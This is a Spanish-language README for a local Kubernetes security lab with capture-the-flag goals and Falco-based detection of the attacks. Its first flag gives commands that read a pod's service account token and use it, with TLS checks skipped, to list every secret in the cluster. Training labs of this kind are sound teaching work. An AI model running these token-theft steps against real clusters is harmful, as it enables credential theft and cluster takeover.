# Lab 04 — Expert: Operation Zero Day

## Objetivo
Simulación de campaña APT en Kubernetes: container escape, lateral
movement, takeover del cluster y threat hunting con Falco.

## Requisitos

- Kind ≥ 0.20: https://kind.sigs.k8s.io/docs/user/quick-start/
- kubectl ≥ 1.28
- Terraform ≥ 1.5 (opcional, para despliegue con TF)

## Arranque

```bash
make lab04
# o
bash lab04/setup-k8s.sh
```

## Acceder a los servicios

```bash
# Verificar pods
kubectl get pods -A --context kind-lab-expert

# Acceder a la API vulnerable
kubectl port-forward svc/vulnerable-api 8282:80 -n lab-expert --context kind-lab-expert
curl http://localhost:8282/

# Ver logs de Falco (detección en tiempo real)
kubectl logs -l app=falco -n lab-expert --context kind-lab-expert -f
```

## Módulos y flags

### Flag #1 — RBAC Escalation
```bash
# El SA tiene permisos excesivos — enumera qué puede hacer
kubectl auth can-i --list \
  --as=system:serviceaccount:lab-expert:lab-overprivileged-sa \
  --context kind-lab-expert

# Usa el token del pod para acceder al API server
TOKEN=$(kubectl exec -n lab-expert deploy/vulnerable-api -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)

kubectl get secrets -A --token=$TOKEN --insecure-skip-tls-verify \
  --server=https://$(kubectl get svc kubernetes -o jsonpath='{.spec.clusterIP}'):443
```

### Flag #2 — Container Info
```bash
# Acceder al endpoint de flag de la API
curl http://localhost:8282/flag
```

### Flag #3 — Blue Team (Falco)
```bash
# Ver alertas de Falco en tiempo real
kubectl logs -l app=falco -n lab-expert -f --context kind-lab-expert | grep ALERT

# La flag se genera al detectar y documentar los 3 tipos de alerta:
# CRITICAL (docker socket), HIGH (SA token), WARNING (outbound)
```

## Terraform (opcional)

```bash
cd lab04/terraform
terraform init
terraform plan
terraform apply -auto-approve
terraform output
```
